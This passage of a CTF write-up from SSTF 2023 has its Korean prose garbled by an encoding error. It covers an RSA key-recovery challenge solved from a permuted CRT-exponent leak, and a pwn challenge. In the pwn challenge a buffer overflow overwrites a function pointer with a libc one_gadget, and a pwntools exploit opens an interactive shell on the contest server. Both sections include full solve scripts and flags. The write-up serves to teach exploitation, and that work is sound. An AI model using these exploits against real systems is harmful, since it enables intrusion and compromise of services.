**FLAG:** `SCTF{4lm057_f0r607_4b0u7_7h1r7y_7w0_b175}`

## Crypto Machine

ë¨¼ì € ë¬¸ì œì˜ description ìœ¼ë¡œë¶€í„° ë¬¸ì œ ì˜ë„ë¥¼ ì¶”ì¸¡í•´ë´…ì‹œë‹¤. `The following memory access patterns were discovered:`ì´ë¼ëŠ” ë§ì—ì„œ, `d_p_as_digits`ì€ `dp`ë¥¼ 16ì§„ìˆ˜ë¡œ ë‚˜íƒ€ëƒˆì„ ë•Œ, `dp`ì˜ ê° ìë¦¬ìˆ˜ë¥¼ ì–´ë–¤ (0,1,â€¦,15)ì˜ permutationìœ¼ë¡œ ì¹˜í™˜í•œ ê²°ê³¼ë¼ê³  ì¶”ì¸¡í•´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ë•Œ ë¬¸ì œê°€ ë°œìƒí•˜ëŠ”ë°, ?, 0, 1ë¡œ ì´ë£¨ì–´ì§„ dp ë¬¸ìì—´ì„ 4ê°œì”© ëŠì–´ì„œ ê°™ì€ íŒ¨í„´ë¼ë¦¬ ë¬¶ì–´ë³´ë©´ ë¹„íŠ¸ ëª¨ìˆœì´ ë°œìƒí•¨ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ì˜ ì½”ë“œë¥¼ ë´…ì‹œë‹¤.

```python
dp_bits_8 = ([dp_bits[i:i+4] for i in range(0, len(dp_bits), 4)])
dq_bits_8 = ([dq_bits[i:i+4] for i in range(0, len(dq_bits), 4)])

pdict = ["????" for _ in range(16)]
qdict = ["????" for _ in range(16)]

cnt = 0
for what, digit in zip(dp_bits_8, d_p_as_digits):
    tmp = ""
    for s1, s2 in zip(pdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2: # meaning that this cause contradiction
                print(what, pdict[digit], digit) # In this case, reached in here
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    pdict[digit] = tmp
```

`if s1!=s2` ë¶€ë¶„ì´ ê³§ ë¹„íŠ¸ì˜ ëª¨ìˆœì´ ë°œìƒí•œë‹¤ëŠ” ëœ»ì´ê³ , ìœ„ ì½”ë“œë¡œ ëŒë ¸ì„ ê²½ìš°ì—ëŠ” ì‹¤ì œë¡œ ëª¨ìˆœì´ ë°œìƒí–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì €ëŠ” ë¬¸ì œ ì˜ë„ê°€ ì•„ë¬´ë¦¬ ìƒê°í•´ë„ ì´ê²ƒ ê°™ë‹¤ê³  ìƒê°í–ˆê³ , ì´ ì¶”ì¸¡ì— ê°•í•œ í™•ì‹ ì„ ê°€ì§€ê³  ìˆì—ˆìŠµë‹ˆë‹¤. ì´ë¦¬ì €ë¦¬ ì–´ë”” ë¶€ë¶„ì´ ë¬¸ì œì¸ì§€ ì‚´í´ë³´ë‹¤, ê³µê°œëœ íŒíŠ¸ë¥¼ ë³´ê³   `d_p_as_digits`ì„ reverseì‹œì¼œì„œ ì ‘ê·¼í•´ë³´ë©´ ë˜ì§€ ì•Šì„ê¹Œë¼ê³  ìƒê°í–ˆê³ , ì‹¤ì œë¡œ ëŒë ¤ë³¸ ê²°ê³¼ ëª¨ìˆœì´ ë°œìƒí•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ì•„ë˜ì˜ ì½”ë“œì—ì„œ ì´ ê³¼ì •ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```python
dp_bits_8 = reversed([dp_bits[i:i+4] for i in range(0, len(dp_bits), 4)])
dq_bits_8 = reversed([dq_bits[i:i+4] for i in range(0, len(dq_bits), 4)])

pdict = ["????" for _ in range(16)]
qdict = ["????" for _ in range(16)]

cnt = 0
for what, digit in zip(dp_bits_8, d_p_as_digits):
    tmp = ""
    for s1, s2 in zip(pdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2: # meaning that this cause contradiction
                print(what, pdict[digit], digit) # In this case, NOT reached in here
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    pdict[digit] = tmp
```

cntë¥¼ í†µí•´ ëª¨ìˆœì´ ë°œìƒí•  ìˆ˜ ìˆì—ˆë˜ ê³³ì´ dpì™€ dq í¬í•¨ 19ê°œì„ì„ í™•ì¸í–ˆì—ˆê³ , ì•½ 1/2í™•ë¥ ë¡œ ë°œìƒí•  ëª¨ìˆœ 19ê°œë¥¼ ëª¨ë‘ í”¼í•´ê°”ê¸°ì— í˜„ì¬ í’€ì´ê°€ ë§¤ìš° ë†’ì€ í™•ë¥ ë¡œ ì˜³ë‹¤ê³  í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì œ ì–´ë–¤ permutationìœ¼ë¡œ ì´ ìˆ«ìë“¤ì´ ì¬ë°°ì—´ ë˜ì—ˆëŠ”ì§€ ì•Œì•„ë‚´ë©´ dpë¥¼ ë³µì›í•  ìˆ˜ ìˆê³ , í”Œë˜ê·¸ë¥¼ ë”¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì–´ëŠì •ë„ í™•ì •ëœ ë¹„íŠ¸ë“¤ì´ ë§ì•˜ê¸°ì— ì™„ì „ íƒìƒ‰ì„ í†µí•´ ê°€ëŠ¥í•œ permutationë“¤ì˜ ìˆ˜ë¥¼ ëª¨ë‘ ì €ì¥í•˜ì—¬, ì´ë¥¼ í† ëŒ€ë¡œ ë§Œë“  dpê°€ ìœ íš¨í•œì§€, ì¦‰ GCD(pow(2, dp, N) - 2, N)ì´ pê°€ ë˜ëŠ”ì§€ ê²€ì‚¬í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íƒìƒ‰í•˜ì˜€ê³ , ìµœì¢…ì ìœ¼ë¡œ pë¥¼ ì–»ì–´ í”Œë˜ê·¸ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì „ì²´ ìµìŠ¤í”Œë¡œì‡ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.

```python
d_q_as_digits=[13, 10, 13, 0, 0, 3, 6, 2, 6, 4, 15, 9, 15, 2, 10, 12, 15, 3, 4, 2, 2, 10, 10, 11, 3, 11, 9, 7, 14, 12, 5, 10, 6, 11, 8, 2, 2, 8, 3, 11, 0, 4, 6, 0, 0, 1, 11, 4, 9, 2, 8, 14, 12, 14, 15, 14, 12, 8, 9, 9, 9, 6, 5, 1, 2, 12, 10, 6, 7, 2, 6, 12, 13, 13, 2, 12, 15, 15, 8, 12, 0, 15, 14, 4, 14, 8, 6, 15, 13, 12, 5, 2, 12, 10, 12, 10, 9, 7, 10, 4, 3, 0, 0, 6, 0, 7, 10, 6, 7, 5, 5, 15, 8, 12, 11, 14, 0, 2, 11, 5, 7, 4, 10, 3, 8, 5, 5, 14, 3, 12, 1, 6, 6, 8, 0, 0, 1, 9, 8, 14, 15, 12, 10, 8, 3, 2, 14, 5, 6, 1, 3, 8, 5, 13, 3, 1, 14, 6, 9, 1, 11, 0, 7, 12, 12, 11, 14, 0, 14, 15, 9, 6, 10, 7, 9, 10, 5, 12, 12, 3, 10, 11, 7, 9, 13, 10, 1, 11, 11, 4, 13, 10, 13, 14, 13, 6, 1, 3, 6, 12, 3, 5, 5, 2, 2, 7, 12, 11, 2, 3, 9, 8, 14, 0, 5, 7, 12, 10, 14, 8, 3, 10, 2, 6, 4, 12, 9, 7, 2, 4, 4, 15, 0, 4, 11, 14, 5, 7, 4, 0, 4, 9, 11, 13]
d_p_as_digits=[0, 13, 5, 1, 1, 11, 11, 3, 6, 15, 13, 11, 8, 15, 10, 8, 2, 7, 2, 4, 11, 1, 15, 1, 15, 5, 10, 11, 3, 2, 13, 7, 2, 15, 1, 6, 12, 9, 11, 11, 15, 10, 4, 11, 8, 4, 11, 13, 7, 3, 15, 0, 10, 3, 3, 13, 14, 0, 5, 14, 0, 4, 5, 10, 1, 7, 9, 12, 4, 14, 12, 11, 6, 10, 9, 10, 10, 15, 13, 0, 7, 5, 8, 4, 2, 4, 2, 4, 9, 13, 12, 2, 8, 7, 0, 9, 7, 15, 9, 12, 12, 11, 3, 13, 13, 5, 6, 0, 8, 1, 1, 13, 11, 10, 15, 3, 13, 6, 7, 3, 7, 0, 8, 11, 5, 15, 1, 12, 7, 13, 2, 6, 9, 15, 3, 14, 1, 5, 6, 1, 8, 6, 5, 15, 13, 9, 13, 1, 4, 7, 9, 7, 5, 6, 8, 14, 15, 2, 1, 15, 0, 14, 9, 7, 9, 1, 12, 6, 10, 1, 5, 8, 14, 3, 15, 13, 13, 15, 5, 6, 9, 0, 0, 3, 1, 6, 10, 6, 2, 4, 1, 4, 11, 7, 8, 3, 6, 9, 1, 15, 4, 14, 12, 15, 15, 10, 6, 6, 2, 1, 14, 15, 12, 1, 6, 9, 11, 7, 5, 11, 2, 2, 7, 8, 6, 5, 13, 10, 13, 15, 8, 3, 5, 11, 14, 14, 1, 2, 15, 2, 13, 5, 6, 15]
dp_bits = "???0??????????????????????????????1???1??????????????????????????????0???1??????????????????????????????1???0??????????????????????????????0???0??????????????????????????????0???1??????????????????????????????0???0??????????????????????????????1???1??????????????????????????????0???1??????????????????????????????0???1??????????????????????????????1???1??????????????????????????????1???0??????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????????0??????????????????????????????????0??????????????????????????????????1??????????????????????????????????1??????????????????????????????????0??????????????????????????????????1??????????????????????????????????1??????????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????????0??????????????????????????????????1??????????????????????????????????0??????????????????????????????1"
dq_bits = "?????????????1??????????????????????????????1?????????????0??????????????????????????????0?????????????1??????????????????????????????1?????????????0??????????????????????????????0?????????????0??????????????????????????????1?????????????0??????????????????????????????0?????????????0??????????????????????????????0?????????????1??????????????????????????????0?????????????0??????????????????????????????1?????????????1??????????????????????????????0?????????????0??????????????????????????????1?????????????1??????????????????????????????1?????????????1??????????????????????????????0?????????????0??????????????????????????????0?????????????1??????????????????????????????0?????????????0??????????????????????????????0?????????????1??????????????????????????????0?????????????1??????????????????????????????1????????????????????????????????????????????0????????????????????????????????????????????0????????????????????????????????????????????0??????????????????????????????1"
n=247986593396209875084012131452934099056733647935670515473445992426598899768930823740730826984242067958254605065641483735657759815550540477139432139634638820800423008986789544454729772610227969667760774290284773564029419009020038717859540703507091627999301056310286835600515951248243765130446092120746666876180555284845580231826491442541887612771483752883992273123591778121336015719453085571539280921597192879792417258434207273636582639024556173720065931114200134382018852051071187029307957847828986113074903235247989408426632701126391774984490145343174906256844624326505324922216905289293
flag_enc = 156539305485572699191103505011941122379332151701553059603110690165418795969653170470280711364827383168784090115293778700305550080169460850699540494174149060011762008936085442871933384008015397771403854069510064266983329620117434277066221978735255338346311441103219209899777467779541064732463934404772189243868464339796846862363442127703578646463227851657485689792622948429216331294552860614314283266751264721228761442121952040022067542021305711961849418456816471091404036663730796501797813320194656309206085482726560893004214523505587683373830593170341654010162468594209116725534777579419

dp_bits_8 = reversed([dp_bits[i:i+4] for i in range(0, len(dp_bits), 4)])
dq_bits_8 = reversed([dq_bits[i:i+4] for i in range(0, len(dq_bits), 4)])

pdict = ["????" for _ in range(16)]
qdict = ["????" for _ in range(16)]

cnt = 0
for what, digit in zip(dp_bits_8, d_p_as_digits):
    tmp = ""
    for s1, s2 in zip(pdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2:
                print(what, pdict[digit], digit) # Not get in here, hopefully
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    pdict[digit] = tmp
print(cnt)
cnt = 0

for what, digit in zip(dq_bits_8, d_q_as_digits):
    tmp = ""
    for s1, s2 in zip(qdict[digit], what):
        if s1 == '?' and s2 == '?':
            tmp += '?'
        elif s1 != '?' and s2 != '?':
            cnt += 1
            if s1 != s2:
                print(what, qdict[digit], digit)
            tmp += s1
        else:
            if s1 != '?':
                tmp += s1
            else:
                tmp += s2
    qdict[digit] = tmp
print(cnt)

qdict[2] = '0010'
for i in range(16):
    print(qdict[i], end = ' ')

print()

q_able = [[] for _ in range(16)]
for i in range(16):
    for j in range(16):
        j1 = bin(j)[2:].zfill(4)
        yes = 1
        for t in range(4):
            if qdict[i][t] == '?' or qdict[i][t] == j1[t]:
                None
            else:
                yes = 0
        if yes:
            q_able[i].append(j)

current = []
ans = []
def search(depth):
    if depth >= 16:
        ans.append(current.copy())
        return
    for i in q_able[depth]:
        if i in current:
            continue
        current.append(i)
        search(depth + 1)
        current.pop()

search(0)

"""
from tqdm import tqdm
for q1 in tqdm(ans):
    dq = 0
    for i in reversed(d_q_as_digits):
        dq *= 16
        dq += q1[i]
    from Crypto.Util.number import *
    q = GCD(pow(2, 0x10001*dq, n) - 2, n)
    if q != 1:
        print(q)
        print(q1)
"""

# got q!

q = 595347331182237061347692817052681611773957447581678972755021305396135991672166078878425800756900446693751359592663038457826236214317841578620119321597623505354261297234533414377268097416007957411658784462114462457802873838204636148813681556004050482640036934572347409577272590176272426287400991
p = n // q

phi = n - p - q + 1
from Crypto.Util.number import *
d = inverse(0x10001, phi)

flag = pow(flag_enc, d, n)
print(long_to_bytes(flag))
print(long_to_bytes(flag)[::-1])
```

`SCTF{1232-32452-4564-2432}`

## 2-outs-in-the-ninth-inning

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // bl
  char *v4; // r12
  void *handle; // [rsp+0h] [rbp-40h]
  char v6[8]; // [rsp+8h] [rbp-38h] BYREF
  int (**v7)(const char *, ...); // [rsp+10h] [rbp-30h]
  unsigned int v8; // [rsp+18h] [rbp-28h]
  unsigned int v9; // [rsp+1Ch] [rbp-24h]
  unsigned __int64 v10; // [rsp+28h] [rbp-18h]

  v10 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  alarm(0xAu);
  v7 = &printf;
  v8 = 0;
  v9 = 0;
  handle = dlopen("libc.so.6", 2);
  puts("You have only 3 chances to win the game.");
  puts("\nThe 1st chacne: Get libc symbol info.");
  showFuncAddr(handle);
  puts("\nThe 2nd chacne: Get libc symbol info.");
  showFuncAddr(handle);
  puts("\nTwo strikes against you. Now that you have only ONE chance.");
  printf("Can you guess the pitcher's selection?\n > ");
  fgets(v6, 16, stdin);
  v3 = v6[0];
  v4 = pitches;
  if ( v3 == v4[rand() % 26] )
    ((void (__fastcall *)(const char *))v7)(" You hit the ball! It's an amazing walk-off homerun. Your team won the game.\n");
  else
    ((void (*)(const char *, ...))v7)(" Struck out. Game Over - You got %d hits and %d runs.\n", v8, v9);
  dlclose(handle);
  exit(0);
}
```

ì½”ë“œë¥¼ ë³´ë©´ libcì—ì„œ ì›í•˜ëŠ” ì‹¬ë³¼ì— í•´ë‹¹í•˜ëŠ” ì£¼ì†Œ ë‘ ê°œë¥¼ ì–»ì„ ìˆ˜ ìˆê³ , fgetsì—ì„œ bofë¡œ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ë®ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì›í•˜ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆì§€ë§Œ ì¸ì ì„¤ì •ì´ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ else ë¬¸ì— ìˆëŠ” ì½”ë“œë¥¼ ë³´ë©´, í•¨ìˆ˜ í˜¸ì¶œì‹œ 2ë²ˆì§¸ ì¸ìì™€ 3ë²ˆì§¸ ì¸ìì— 0ì„ ì „ë‹¬í•˜ê³  ìˆìœ¼ë¯€ë¡œ ì¡°ê±´ì„ ë§Œì¡±í•˜ëŠ” one_gadgetì´ ì¡´ì¬í•  í™•ë¥ ì´ ë†’ìŠµë‹ˆë‹¤. libcëŠ” databaseì—ì„œ êµ¬í•´ì˜¤ê³  ì¡°ê±´ì— ë§ëŠ” one_gadgetì„ ì°¾ì•„ì„œ ë¬¸ì œë¥¼ í•´ê²°í–ˆìŠµë‹ˆë‹¤. 

```python
from pwn import *

#r = process("./9end2outs")
r = remote("2outs.sstf.site", 1337)

r.sendlineafter("> ", "system")
r.recvuntil("is at ")
system = int(r.recvn(14), 16)
libc_base = system - 0x50d60
one_gadget = libc_base + 0xebcf8
log.info(hex(libc_base))

r.sendlineafter("> ", "system")

r.sendlineafter("> ", p64(one_gadget)*2)

r.interactive()
```

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%2016.png)

`SCTF{c0ngr47s_y0u_R_Th3_MVP_0f_th15_94m3}`